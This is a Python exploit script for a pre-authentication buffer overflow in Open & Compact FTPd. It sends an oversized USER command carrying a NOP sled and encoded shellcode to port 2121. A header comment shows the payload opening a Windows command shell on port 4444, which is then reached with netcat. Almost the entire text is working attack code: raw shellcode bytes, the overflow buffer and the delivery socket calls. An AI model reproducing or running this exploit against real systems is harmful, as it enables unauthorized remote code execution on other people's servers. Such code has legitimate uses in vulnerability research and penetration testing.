

################################################################
#Title: Open & Compact FTPd Pre-Authentication Remote Exploit
#
#Written by: Lincoln
#Originally discovered by: loneferret
#Reference:
#http://www.exploit-db.com/exploits/11391
#Tested on: XPSP2
#root@box:~# ./ftpd.py 192.168.139.130
#
#Try connecting to host on port 4444
#
#root@box:~# nc -vn 192.168.139.130 4444
#(UNKNOWN) [192.168.139.130] 4444 (?) open
#Microsoft Windows XP [Version 5.1.2600]
#(C) Copyright 1985-2001 Microsoft Corp.
#
#C:\Documents and Settings\crap\Desktop\Release>
#################################################################

import socket,sys
host = sys.argv[1]

#[*] x86/shikata_ga_nai succeeded with size 369 (iteration=1)

sc = ("\x31\xc9\xbd\xdd\x2b\x25\x18\xb1\x56\xdb\xcb\xd9\x74\x24\xf4"
"\x58\x31\x68\x10\x83\xe8\xfc\x03\x68\x0c\x3f\xde\xd9\xf0\x36"
"\x21\x22\x01\x28\xab\xc7\x30\x7a\xcf\x8c\x61\x4a\x9b\xc1\x89"
"\x21\xc9\xf1\x1a\x47\xc6\xf6\xab\xed\x30\x38\x2b\xc0\xfc\x96"
"\xef\x43\x81\xe4\x23\xa3\xb8\x26\x36\xa2\xfd\x5b\xb9\xf6\x56"
"\x17\x68\xe6\xd3\x65\xb1\x07\x34\xe2\x89\x7f\x31\x35\x7d\x35"
"\x38\x66\x2e\x42\x72\x9e\x44\x0c\xa3\x9f\x89\x4f\x9f\xd6\xa6"
"\xbb\x6b\xe9\x6e\xf2\x94\xdb\x4e\x58\xab\xd3\x42\xa1\xeb\xd4"
"\xbc\xd4\x07\x27\x40\xee\xd3\x55\x9e\x7b\xc6\xfe\x55\xdb\x22"
"\xfe\xba\xbd\xa1\x0c\x76\xca\xee\x10\x89\x1f\x85\x2d\x02\x9e"
"\x4a\xa4\x50\x84\x4e\xec\x03\xa5\xd7\x48\xe5\xda\x08\x34\x5a"
"\x7e\x42\xd7\x8f\xf8\x09\xb0\x7c\x36\xb2\x40\xeb\x41\xc1\x72"
"\xb4\xf9\x4d\x3f\x3d\x27\x89\x40\x14\x9f\x05\xbf\x97\xdf\x0c"
"\x04\xc3\x8f\x26\xad\x6c\x44\xb7\x52\xb9\xca\xe7\xfc\x12\xaa"
"\x57\xbd\xc2\x42\xb2\x32\x3c\x72\xbd\x98\x4b\xb5\x73\xf8\x1f"
"\x51\x76\xfe\x8e\xfd\xff\x18\xda\xed\xa9\xb3\x73\xcf\x8d\x0b"
"\xe3\x30\xe4\x27\xbc\xa6\xb0\x21\x7a\xc9\x40\x64\x28\x66\xe8"
"\xef\xbb\x64\x2d\x11\xbc\xa1\x05\x58\x84\x21\xdf\x34\x46\xd0"
"\xe0\x1c\x30\x71\x72\xfb\xc1\xfc\x6f\x54\x95\xa9\x5e\xad\x73"
"\x47\xf8\x07\x66\x9a\x9c\x60\x22\x40\x5d\x6e\xaa\x05\xd9\x54"
"\xbc\xd3\xe2\xd0\xe8\x8b\xb4\x8e\x46\x6d\x6f\x61\x31\x27\xdc"
"\x2b\xd5\xbe\x2e\xec\xa3\xbf\x7a\x9a\x4c\x71\xd3\xdb\x73\xbd"
"\xb3\xeb\x0c\xa0\x23\x13\xc7\x61\x53\x5e\x4a\xc3\xfc\x07\x1e"
"\x56\x61\xb8\xf4\x94\x9c\x3b\xfd\x64\x5b\x23\x74\x61\x27\xe3"
"\x64\x1b\x38\x86\x8a\x88\x39\x83\x81")

buf = "\x42\x2c\x20" * 199 + "\x90" * 10 + sc

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, 2121))
s.recv(1024)
s.send("USER " + buf + "\r\n")
s.recv(1024)
print "\nTry connecting to host on port 4444\n"
s.close()



